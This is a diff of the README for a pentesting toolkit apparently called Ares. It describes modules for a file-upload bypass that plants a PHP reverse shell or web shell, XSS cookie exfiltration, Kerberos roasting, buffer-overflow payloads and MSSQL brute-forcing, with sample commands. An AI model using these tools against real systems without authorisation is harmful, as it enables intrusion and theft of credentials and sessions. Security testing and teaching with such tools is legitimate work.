@@ -1,61 +1,27 @@
 # ares-attack
 Ares helps Pentesters prepare for war by performing simple attacks against Web Apps and Windows targets (WAR files sold seperately).
 
-# Functionality
-Ares is a collection of scripts which perform different kinds of attacks for Penetration Testing.
+## Table of Contents
 
-Each of these scripts can be run independently, or they can be launched from the main `ares.sh` script.
+- [Setup](#setup)
+- [Functionality](#functionality)
+- [Uploader](#uploader)
+- [Roasting](#roasting)
+- [XSS](#xss)
+- [Mutator](#mutator)
+- [Overflower](#overflower)
+- [MSSQL Pwner](#mssql-pwner)
+- [Related Projects](#related-projects)
 
-For the most part, this is a series of wrappers which utilize common Pentesting tools; why reinvent the wheel?
 
-Run `ares -h` for the main help menu, or specify a module to get its help menu (e.g. `ares -m upload -h`)
-
-## Modules
-So far there are modules for: XSS (Stealing Cookies), Active Directory Roasting, Mutating a wordlist, & Bruteforcing MSSQL in an AD environment.
-
-In subsequent versions, each of these will be expanded upon, and more modules will be added.
-
-### XSS
-This module performs the following 3 actions:
-
-1) Starts a Flask server that will recieve a target's Cookies & save them to a file.
-
-2) Creates an example XSS payload which will send the target's Cookies to the Flask server.
-
-3) Redirects the target to a specified URL (i.e. an inconspicuous page on the website).
-
-### Note
-Ensure that your account has the privileges needed to listen on the port you specified for the Flask server.
-
-### ASREP Roasting & Kerberoasting
-A wrapper program to simplify Roasting by interactively prompting for input that Ares will use for impacket's GetNPUsers or GetUserSPNs.
-
-### Wordlist Mutation
-Mutates each entry in a wordlist, & save the output in a clear-text wordlist.
-
-Ares will also optionally also save these entries in a specified format (i.e. Base64 Encoded or as a hash).
-
-Some Web Apps want credentials in B64 or want a password hash (e.g. MD5 or SHA256), so this prepares a wordlist that can be used with your favorite bruteforcing tool (e.g. hydra, patator, or ffuf).
-
-I'll add support for more hashing algorithms & encoding methods as the need arises.
-
-### Bruteforce MSSQL in AD Environment
-Outside of an AD environment, tools like `hydra` work well for Bruteforcing MSSQL Servers.
-
-However, I've noticed that many tools like `hydra` currently throw false negatives when AD Authentication is in use.
-
-impacket's mssqlclient tool can reliably connect to these servers, but doesn't come with any bruteforcing functionality.
-
-Ares uses a simple wrapper program to add bruteforcing capabilities to mssqlclient.
-
-I'll try to improve the speed of this program if conventional BF tools don't address this issue, but as it is, Ares is still a reliable solution.
-
-# Setup
+## Setup
 After installing the dependencies, navigate to this Repo's directory & run `setup.sh`. 
+
+Depending on how they are installed, the name of Impacket's tools can vary (e.g. impacket-GetNPUsers vs GetNPUsers.py). This script ensures that tool names use the proper format.
 
 `bash ./setup.sh`
 
-## Dependencies
+### Dependencies
 impacket-GetNPUsers
 
 impacket-GetUserSPNs
@@ -64,14 +30,76 @@ impacket-mssqlclient
 
 crunch
 
-### Note
-Ensure all aforementioned dependencies are in your PATH and are named appropriately.
+## Functionality
+```
+Ares will interactively prompt you for input unless you provide the necessary arguments for the selected module.
+	
+[Options]
+	-h: Show this help message
+	-m <MODULE>: Specify the module you want to use
 
-Depending on how they are installed, the name of Impacket's tools can vary (e.g. impacket-GetNPUsers vs GetNPUsers.py).
+[Modules]
+	upload: Bypass file upload defenses to get a backdoor on a Web App. Currently, Uploader only supports PHP file types
+	roast: ASREP Roasting & Kerberoasting
+	xss: Setup for XSS cookie exfil
+	mutate: Wordlist mutation
+	bof: Buffer Overflow payload generator
+	mssql: Bruteforce MSSQL in Active Directory environment
+```
 
-You can convert the tool names to the proper format by running `setup.sh`
+### Uploader
+Bypass common File Upload defenses.
 
-# Related Projects
+```
+[Options]
+	-h: Display this help message
+	-i <IP_Addres>: The IP Address to use for the Reverse Shell payload (i.e. your interface)
+	-p <PORT>: The port that your listener is running on
+	-u <URL>: The target URL that's used in POST Requests to upload a file
+	-n <NAME>: The 'name' attribute that's used in POST Requests (e.g. file for name="file")
+	-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.
+	-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.
+	-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e
+
+[Example Usage]
+	ares -m upload -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
+	ares -m upload -u http://10.10.40.117/panel/ -n fileUpload -b
+
+[Supported File Types]
+
+Currently, Uploader only supports PHP files. More file types will be added in subsequent updates.
+```
+
+### Roasting
+Perform ASREP Roasting & Kerberoasting.
+
+### XSS
+Ensure that your account has the privileges needed to listen on the port you specified for the Flask server.
+
+This module performs the following 3 actions:
+
+1) Starts a Flask server that will recieve a target's Cookies & save them to a file.
+
+2) Creates an example XSS payload which will send the target's Cookies to the Flask server.
+
+3) Redirects the target to a specified URL (i.e. an inconspicuous page on the website).
+
+### Mutator
+Modify wordlist entries & optionally convert them to an alternate format (i.e., Base64 Encoded or as a hash).
+
+Some Web Apps want credentials supplied in B64 or as a password hash, so this prepares a wordlist that can be used with your favorite bruteforcing tool (e.g., `hydra`, `patator`, or `ffuf`).
+
+### Overflower
+Generate a binary payload using the specified address & offset.
+
+### MSSQL Pwner
+Unlike `hydra`, `impacket-mssqlclient` supports the use of SSPI authentication for MSSQL servers.
+
+This makes it more reliable in an Active Directory environment, but it doesn't come with any bruteforcing functionality.
+
+Ares uses a simple wrapper program to add bruteforcing capabilities to `impacket-mssqlclient`.
+
+## Related Projects
 Check out the rest of the Pentesting Pantheon:
 
 Perform recon to see everything your target is hiding with Argus (https://github.com/Komodo-pty/argus-recon/)
